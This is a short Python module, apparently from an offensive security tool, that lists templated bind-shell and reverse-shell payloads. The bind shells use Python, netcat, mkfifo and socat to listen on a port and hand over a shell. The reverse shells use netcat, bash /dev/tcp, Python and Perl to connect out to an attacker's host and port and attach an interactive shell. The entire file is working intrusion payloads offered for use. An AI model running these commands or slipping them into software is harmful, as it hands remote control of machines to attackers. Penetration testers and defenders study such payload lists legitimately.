os_print = """echo {s1}"""

bind_shell = [
    """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", {port}));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("{shell}");s.close()'""",
    """nc -l -p {port} -e {shell}""",
    """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc -l {port} >/tmp/f; rm -rf /tmp/f""",
    """socat tcp-l:{port} exec:{shell}"""
]

reverse_shell = [
    """sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {host} {port} >/tmp/f""",
    """sleep 1; nc -e {shell} {host} {port}""",
    """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{shell}","-i"]);'""",
    "sleep 1; /bin/bash -c '{shell} 0</dev/tcp/{host}/{port} 1>&0 2>&0'",
    """perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");}};'""",
    # TODO: ruby payload's broken, fix it.
    # """ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("{shell} -i <&%%d >&%%d 2>&%%d",f,f,f)'""",
    """sleep 1; python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("{shell}");'""",
]
